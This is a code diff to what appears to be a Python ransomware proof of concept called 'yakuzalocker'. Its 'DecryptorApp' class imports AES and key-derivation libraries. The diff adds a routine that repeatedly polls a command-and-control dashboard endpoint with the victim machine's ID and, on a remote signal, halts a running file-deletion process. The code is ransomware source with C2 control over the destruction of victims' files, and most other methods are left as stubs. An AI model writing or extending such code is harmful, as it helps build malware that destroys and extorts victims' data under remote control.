@@ -18,7 +18,7 @@ from Crypto.Cipher import AES
 from Crypto.Protocol.KDF import PBKDF2
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad
-from requests import post, exceptions
+from requests import post, exceptions, get
 from time import sleep
 from PIL import Image, ImageTk
 from threading import Event, Thread
@@ -621,8 +621,38 @@ class DecryptorApp(Tk):
         # Start multithread for Checking Self Destroy Remote signal from POC-C&C Dashboard
         Thread(target=self.check_for_remote_stop_signal, args=self.machineId, daemon=True).start()
 
+    # this function stop deletion process when stop_signal arrived from POC-C&C Dashboard
     def check_for_remote_stop_signal(self, machine_id, check_interval=10):
-        pass
+        url = f"http://localhost/yakuzalocker/includes/api/check_stop_signal.php?machine_id={machine_id}"
+        while not self.stopDeletion:
+            try:
+                # Send GET request to POC Dashboard and return response as JSON
+                response = get(url, timeout=10)
+                response.raise_for_status()
+                data = response.json()
+
+                # If stop_signal arrived(stop_signal is 1), stop the deletion process
+                if data.get("stop_signal") == "1":
+                    self.stop_deletion_process_remotely()
+                    break
+
+            except exceptions.RequestException as e:
+                pass
+            sleep(check_interval)
+
+
+    #Step 29.1: Function to stop the deletion process remotely
+    def stop_deletion_process_remotely(self):
+        if not self.stopDeletion:
+            self.stopDeletion = True
+            self.deletionStopped = True
+            self.stopEvent.set()
+            self.log("Deletion process stopped by remote command.", 'blue')
+
+            if hasattr(self, 'deletion_dialog') and self.deletion_dialog.winfo_exists():
+                self.deletion_dialog.destroy()
+                self.deletion_dialog = None # noqa
+
 
     def initialize_ui(self):
         pass
@@ -631,6 +661,9 @@ class DecryptorApp(Tk):
         pass
 
     def load_timer_state(self):
+        pass
+
+    def log(self, message, color='green'):
         pass
 
 # if __name__ == "__main__":
